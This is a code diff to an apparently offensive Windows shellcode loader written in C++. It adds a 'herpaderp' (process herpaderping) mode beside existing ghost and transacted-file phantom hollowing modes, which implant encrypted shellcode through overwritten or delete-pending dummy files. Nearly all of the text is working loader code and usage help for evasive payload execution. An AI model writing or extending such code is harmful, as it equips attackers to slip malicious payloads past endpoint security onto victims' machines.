@@ -9,12 +9,12 @@
 #include "util.h"
 #include "aes.h"
 
-#include "map_dll_image.h"
-
 #include "transacted_file.h"
 #include "delete_pending_file.h"
 
 #pragma warning(disable:4996)
+
+enum phantom { ghost, txf, herpaderp } phantomType;
 
 int prepare_payload(LPCSTR payload_path, OUT BYTE*& raw_payload, OUT BYTE*& payload, OUT size_t& raw_size, OUT size_t& payload_size) {
 
@@ -395,7 +395,7 @@ int dll_hollower(const char* payload_path, bool isClassic, char target_dll[MAX_P
 	return 0;
 }
 
-int phantom_hollower(LPCSTR payload_path, bool isGhost, const char temp_pathc[MAX_PATH] = NULL) {
+int phantom_hollower(LPCSTR payload_path, phantom phantomType, const char temp_pathc[MAX_PATH] = NULL) {
 
 	BYTE* raw_payload;
 	BYTE* payload;
@@ -416,8 +416,18 @@ int phantom_hollower(LPCSTR payload_path, bool isGhost, const char temp_pathc[MA
 	std::cout << "[*] Created dummy file: ";
 	std::wcout << dummy_name << std::endl;
 
-	HANDLE hSection = (isGhost) ? make_section_from_delete_pending_file(dummy_name, payload, payload_size) : make_transacted_section(dummy_name, payload, payload_size);
+	HANDLE hSection = NULL;
 	
+	if (phantomType == (phantom)ghost) {
+		hSection = make_section_from_delete_pending_file(dummy_name, payload, payload_size);
+	}
+	else if (phantomType == (phantom)txf) {
+		hSection = make_transacted_section(dummy_name, payload, payload_size);
+	}
+	else {
+		hSection = make_section_from_overwrite_file(dummy_name, payload, payload_size);
+	}
+
 	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
 		std::cout << "Creating detected section has failed!\n";
 		return false;
@@ -462,11 +472,9 @@ int phantom_hollower(LPCSTR payload_path, bool isGhost, const char temp_pathc[MA
 		return NULL;
 	}
 	//protection changed to RX
-	
 
 	// Free the buffer that was used for the payload's preparation
 	peconv::free_pe_buffer(payload);
-
 
 	// Run the payload:
 	int ret = run_implant(sectionBaseAddress, raw_payload);
@@ -500,6 +508,9 @@ void printHelp() {
 		"Ghostly Hollowing: ghost <encrypted payload> [dummy file]\n"
 			"\t<encrypted payload> - the shellcode that will be implanted\n"
 			"\t[dummy file] - the dummy file (necessarily exist) that will be put in delete-pending state (default: create random file)\n"
+		"Herpaderply Hollowing: herpaderp <encrypted payload> [dummy file]\n"
+			"\t<encrypted payload> - the shellcode that will be implanted\n"
+			"\t[dummy file] - the dummy file (necessarily exist) that will be overwritten (default: create random file)\n"
 		<< std::endl;
 	return;
 }
@@ -562,20 +573,32 @@ int main(int argc, char* argv[], char* envp[])
 		private_loader(hagrid[1]);
 	}
 	else if (strcmp(hagrid[0], "ghost") == 0) {
-
 		std::cout << "Ghostly Hollowing\n";
+		phantomType = (phantom)ghost;
+
 		if (h < 3) 
-			phantom_hollower(hagrid[1], true);
+			phantom_hollower(hagrid[1], phantomType);
 		else 
-			phantom_hollower(hagrid[1], true, hagrid[2]);
+			phantom_hollower(hagrid[1], phantomType, hagrid[2]);
 		
 	}
 	else if (strcmp(hagrid[0], "txf") == 0) {
 		std::cout << "Transacted Hollowing\n";
+		phantomType = (phantom)txf;
+
 		if (h < 3)
-			phantom_hollower(hagrid[1], false);
+			phantom_hollower(hagrid[1], phantomType);
 		else
-			phantom_hollower(hagrid[1], false, hagrid[2]);
+			phantom_hollower(hagrid[1], phantomType, hagrid[2]);
+	}
+	else if (strcmp(hagrid[0], "herpaderp") == 0) {
+		std::cout << "Herpaderply Hollowing\n";
+		phantomType = (phantom)herpaderp;
+
+		if (h < 3)
+			phantom_hollower(hagrid[1], phantomType);
+		else
+			phantom_hollower(hagrid[1], phantomType, hagrid[2]);
 	}
 	else {
 		printHelp();
